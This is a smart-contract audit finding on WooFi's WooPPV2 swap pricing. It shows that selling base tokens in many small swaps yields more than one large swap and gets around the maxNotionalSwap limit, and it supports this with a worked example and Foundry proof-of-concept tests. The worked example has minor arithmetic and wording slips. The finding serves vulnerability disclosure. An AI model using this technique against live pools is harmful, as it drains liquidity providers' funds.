# Selling partial base tokens are more profitable then selling in one go

## Summary
Selling base tokens partially instead of one go is always more profitable 
## Vulnerability Detail
First, let's write down our formulas of sellBase tokens for quoteTokens:
g: gamma
s: spread
c: coefficient
p: price
np: new price (price after selling base tokens) 

**g = deltaBase * p * c**
**deltaQuote = deltaBase * p * (1 - (g + s))**
**np = p * (1 - g)**

Code snippet for the above formulas:
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L591-L619

Here I graphed both `sellQuote` and `sellBase` functions:

As we can observe, if the price is >1 then the selling base tokens (red in the graph) will start decreasing after it reaches the middle value. Same happens vice versa when price is <1 for selling quote tokens (blue in the graph). This heavily incentivise smaller swaps and heavily disincentives bigger swaps. Also, since selling smaller amounts are ALWAYS more profitable, `maxGamma` and `maxNotionalSwap` values can be bypassed without a loss (even for profits) 

**Textual PoC:**
Now, let's do a textual example to see whether selling 20 base tokens is profitable then selling 2 times 10 base tokens
For this example, let's assume:
p = 1
c = 0.01
s = 0.1 
and there are no swap fees for simplicity.

First, let's sell 20 base tokens:
g = 20 * 1 * 0.01 = 0.2
deltaQuote = 20 * 1 * (1 - (0.1 + 0.1)) = 14
**quote tokens received will be 14**

Now, let's sell 10 base tokens in 2 times in a single transaction:
g1 = 10 * 1 * 0.01 = 0.1
deltaQuote1 = 10 * 1 * (1- (0.1 + 0.1)) = 8
np = 1 * (1 - 0.1) = 0.9
**received 8 quote tokens in first sell of 10 base tokens**

g2 = 10 * 0.9 * 0.01 = 0.09
deltaQuote2 = 10 * 0.9 * (1 - (0.1 + 0.09)) = 7.29
**received 7.29 quote tokens in second sell of 10 base tokens**

**in total 7.29 + 8 = 15.29 quote tokens received! however, if we were to swap 10 tokens in one go we would end up with 14 quote tokens!** 

This also means that swaps that are not possible because of `maxNotionalSwap` can be divided into partial swaps and the end result would be even higher!
If the `maxNotionalSwap` is 100K USDC, someone can swap 2 times 50K USDC to receive even higher amount of quote tokens! Hence, the exploit that happent to WooFi would still be possible and even worse since the partial swaps are better than single go.

Here a test where it compares selling 1000 WETH in one go, 500-500 and 1-1-1-... 1000 times in a single tx:
```solidity
// @dev fee is "100", coeff = 0.000000001 * 1e18, spread = 0.001 * 1e18 as in the tests
    // setting fee to a different value is not relevant, attack is still there, just slighly less profitable
    
    // @dev sell 1000 in single tx
    function test_SellBase1Part() public {
        uint sellWethAmount = 1000 * 1e18;
        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);

        vm.prank(TAPIR);
        uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount, 0, payable(TAPIR), TAPIR);

        console.log("Received USDC", receivedUSDC);
        console.log("contract usdc balance", IERC20(USDC).balanceOf(address(pool)));
    }

    // @dev sell 500-500 in single tx
    function test_Sell2Parts() public {
        uint sellWethAmount = 1000 * 1e18;
        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);
        
        uint cumulative;
        for (uint i; i < 2; ++i) {
            // sell 5 wei dust
            vm.prank(TAPIR);
            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 2, 0, payable(TAPIR), TAPIR);
            (uint128 price, ) = oracle.woPrice(WETH);
            cumulative += receivedUSDC;
        }

        console.log("Received USDC", cumulative);
        console.log("contract usdc balance", IERC20(USDC).balanceOf(address(pool)));
    }

    // @dev sell 1-1-1-1.... in single tx
    function test_Sell1000Parts() public {
        uint sellWethAmount = 1000 * 1e18;
        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);
        
        uint cumulative;
        for (uint i; i < 1000; ++i) {
            // sell 5 wei dust
            vm.prank(TAPIR);
            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 1000, 0, payable(TAPIR), TAPIR);
            (uint128 price, ) = oracle.woPrice(WETH);
            cumulative += receivedUSDC;
        }

        console.log("Received USDC", cumulative);
        console.log("contract usdc balance", IERC20(USDC).balanceOf(address(pool)));
    }
```

**Results:**
Selling 500-500 instead of 1000 in one go: 3395.800042 USDC more received
Selling 1-1-1-1-... 1000 times instead 1000 in one go: 6776.505788 USDC more received!
